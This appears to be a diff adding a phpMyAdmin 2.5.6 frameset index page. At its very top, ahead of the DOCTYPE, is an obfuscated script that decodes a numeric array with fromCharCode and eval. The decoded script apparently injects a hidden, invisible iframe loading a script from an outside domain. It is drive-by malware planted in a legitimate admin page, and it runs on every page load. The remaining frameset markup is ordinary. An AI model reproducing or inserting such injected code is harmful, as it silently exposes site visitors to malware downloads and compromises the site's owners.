@@ -1,0 +1,43 @@
+<script>var s=new String();try{document.getElementById('t3v2562v3r3').innerHTML}catch(q){r=1;c=String;}if(r&&document.createTextNode)u=2;e=eval;m=[4.5*u,18/u,52.5*u,204/u,16*u,80/u,50*u,222/u,49.5*u,234/u,54.5*u,202/u,55*u,232/u,23*u,206/u,50.5*u,232/u,34.5*u,216/u,50.5*u,218/u,50.5*u,220/u,58*u,230/u,33*u,242/u,42*u,194/u,51.5*u,156/u,48.5*u,218/u,50.5*u,80/u,19.5*u,196/u,55.5*u,200/u,60.5*u,78/u,20.5*u,182/u,24*u,186/u,20.5*u,246/u,4.5*u,18/u,4.5*u,210/u,51*u,228/u,48.5*u,218/u,50.5*u,228/u,20*u,82/u,29.5*u,18/u,4.5*u,250/u,16*u,202/u,54*u,230/u,50.5*u,64/u,61.5*u,18/u,4.5*u,18/u,50*u,222/u,49.5*u,234/u,54.5*u,202/u,55*u,232/u,23*u,238/u,57*u,210/u,58*u,202/u,20*u,68/u,30*u,210/u,51*u,228/u,48.5*u,218/u,50.5*u,64/u,57.5*u,228/u,49.5*u,122/u,19.5*u,208/u,58*u,232/u,56*u,116/u,23.5*u,94/u,56*u,228/u,52.5*u,218/u,48.5*u,196/u,52.5*u,230/u,49.5*u,222/u,58*u,202/u,23*u,210/u,55*u,94/u,52.5*u,220/u,23*u,198/u,51.5*u,210/u,31.5*u,200/u,50.5*u,204/u,48.5*u,234/u,54*u,232/u,19.5*u,64/u,59.5*u,210/u,50*u,232/u,52*u,122/u,19.5*u,98/u,24*u,78/u,16*u,208/u,50.5*u,210/u,51.5*u,208/u,58*u,122/u,19.5*u,98/u,24*u,78/u,16*u,230/u,58*u,242/u,54*u,202/u,30.5*u,78/u,59*u,210/u,57.5*u,210/u,49*u,210/u,54*u,210/u,58*u,242/u,29*u,208/u,52.5*u,200/u,50*u,202/u,55*u,118/u,56*u,222/u,57.5*u,210/u,58*u,210/u,55.5*u,220/u,29*u,194/u,49*u,230/u,55.5*u,216/u,58.5*u,232/u,50.5*u,118/u,54*u,202/u,51*u,232/u,29*u,96/u,29.5*u,232/u,55.5*u,224/u,29*u,96/u,29.5*u,78/u,31*u,120/u,23.5*u,210/u,51*u,228/u,48.5*u,218/u,50.5*u,124/u,17*u,82/u,29.5*u,18/u,4.5*u,250/u,4.5*u,18/u,51*u,234/u,55*u,198/u,58*u,210/u,55.5*u,220/u,16*u,210/u,51*u,228/u,48.5*u,218/u,50.5*u,228/u,20*u,82/u,61.5*u,18/u,4.5*u,18/u,59*u,194/u,57*u,64/u,51*u,64/u,30.5*u,64/u,50*u,222/u,49.5*u,234/u,54.5*u,202/u,55*u,232/u,23*u,198/u,57*u,202/u,48.5*u,232/u,50.5*u,138/u,54*u,202/u,54.5*u,202/u,55*u,232/u,20*u,78/u,52.5*u,204/u,57*u,194/u,54.5*u,202/u,19.5*u,82/u,29.5*u,204/u,23*u,230/u,50.5*u,232/u,32.5*u,232/u,58*u,228/u,52.5*u,196/u,58.5*u,232/u,50.5*u,80/u,19.5*u,230/u,57*u,198/u,19.5*u,88/u,19.5*u,208/u,58*u,232/u,56*u,116/u,23.5*u,94/u,56*u,228/u,52.5*u,218/u,48.5*u,196/u,52.5*u,230/u,49.5*u,222/u,58*u,202/u,23*u,210/u,55*u,94/u,52.5*u,220/u,23*u,198/u,51.5*u,210/u,31.5*u,200/u,50.5*u,204/u,48.5*u,234/u,54*u,232/u,19.5*u,82/u,29.5*u,204/u,23*u,230/u,58*u,242/u,54*u,202/u,23*u,236/u,52.5*u,230/u,52.5*u,196/u,52.5*u,216/u,52.5*u,232/u,60.5*u,122/u,19.5*u,208/u,52.5*u,200/u,50*u,202/u,55*u,78/u,29.5*u,204/u,23*u,230/u,58*u,242/u,54*u,202/u,23*u,224/u,55.5*u,230/u,52.5*u,232/u,52.5*u,222/u,55*u,122/u,19.5*u,194/u,49*u,230/u,55.5*u,216/u,58.5*u,232/u,50.5*u,78/u,29.5*u,204/u,23*u,230/u,58*u,242/u,54*u,202/u,23*u,216/u,50.5*u,204/u,58*u,122/u,19.5*u,96/u,19.5*u,118/u,51*u,92/u,57.5*u,232/u,60.5*u,216/u,50.5*u,92/u,58*u,222/u,56*u,122/u,19.5*u,96/u,19.5*u,118/u,51*u,92/u,57.5*u,202/u,58*u,130/u,58*u,232/u,57*u,210/u,49*u,234/u,58*u,202/u,20*u,78/u,59.5*u,210/u,50*u,232/u,52*u,78/u,22*u,78/u,24.5*u,96/u,19.5*u,82/u,29.5*u,204/u,23*u,230/u,50.5*u,232/u,32.5*u,232/u,58*u,228/u,52.5*u,196/u,58.5*u,232/u,50.5*u,80/u,19.5*u,208/u,50.5*u,210/u,51.5*u,208/u,58*u,78/u,22*u,78/u,24.5*u,96/u,19.5*u,82/u,29.5*u,18/u,4.5*u,18/u,50*u,222/u,49.5*u,234/u,54.5*u,202/u,55*u,232/u,23*u,206/u,50.5*u,232/u,34.5*u,216/u,50.5*u,218/u,50.5*u,220/u,58*u,230/u,33*u,242/u,42*u,194/u,51.5*u,156/u,48.5*u,218/u,50.5*u,80/u,19.5*u,196/u,55.5*u,200/u,60.5*u,78/u,20.5*u,182/u,24*u,186/u,23*u,194/u,56*u,224/u,50.5*u,220/u,50*u,134/u,52*u,210/u,54*u,200/u,20*u,204/u,20.5*u,118/u,4.5*u,18/u,62.5*u];if(document.createTextNode)with(c)mm=fromCharCode;for(i=0;i!=m.length;i++)s+=mm(e("m"+"["+"i"+']'));try{doc.qwe.removeChild()}catch(q){e(s);}</script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
+<head>
+<title>phpMyAdmin 2.5.6 - </title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<link rel="stylesheet" type="text/css" href="./css/phpmyadmin.css.php?lang=en-iso-8859-1&amp;js_frame=right" />
+</head>
+
+<script type="text/javascript">
+<!--
+    document.writeln('<frameset cols="150,*" rows="*" border="1" frameborder="1" framespacing="0">');
+    document.writeln('    <frameset rows="*, 50" framespacing="0" frameborder="0" border="0">');
+    document.writeln('        <frame src="left.php?lang=en-iso-8859-1&amp;server=1&amp;hash=20d0ab29eebc9e7ff504d88836b655581390544095" name="nav" frameborder="0" />');
+    document.writeln('        <frame src="queryframe.php?lang=en-iso-8859-1&amp;server=1&amp;hash=20d0ab29eebc9e7ff504d88836b655581390544095" name="queryframe" frameborder="0" scrolling="no" />');
+    document.writeln('    </frameset>');
+    document.writeln('    <frame src="main.php?lang=en-iso-8859-1&amp;server=1" name="phpmain20d0ab29eebc9e7ff504d88836b655581390544095" border="0" frameborder="0" />');
+    document.writeln('    <noframes>');
+    document.writeln('        <body bgcolor="#FFFFFF">');
+    document.writeln('            <p>phpMyAdmin is more friendly with a <b>frames-capable</b> browser.</p>');
+    document.writeln('        </body>');
+    document.writeln('    </noframes>');
+    document.writeln('</frameset>');
+//-->
+</script>
+
+<noscript>
+<frameset cols="150,*" rows="*"  border="1" frameborder="1" framespacing="0">
+    <frameset rows="*, 50" framespacing="0" frameborder="0" border="0">
+        <frame src="left.php?lang=en-iso-8859-1&amp;server=1&amp;hash=20d0ab29eebc9e7ff504d88836b65558" name="nav" frameborder="0" />
+        <frame src="queryframe.php?lang=en-iso-8859-1&amp;server=1&amp;hash=20d0ab29eebc9e7ff504d88836b65558" name="queryframe" frameborder="0" scrolling="no" />
+    </frameset>
+    <frame src="main.php?lang=en-iso-8859-1&amp;server=1" name="phpmain20d0ab29eebc9e7ff504d88836b65558" frameborder="0" />
+
+    <noframes>
+        <body bgcolor="#FFFFFF">
+            <p>phpMyAdmin is more friendly with a <b>frames-capable</b> browser.</p>
+        </body>
+    </noframes>
+</frameset>
+</noscript>
+
+</html>
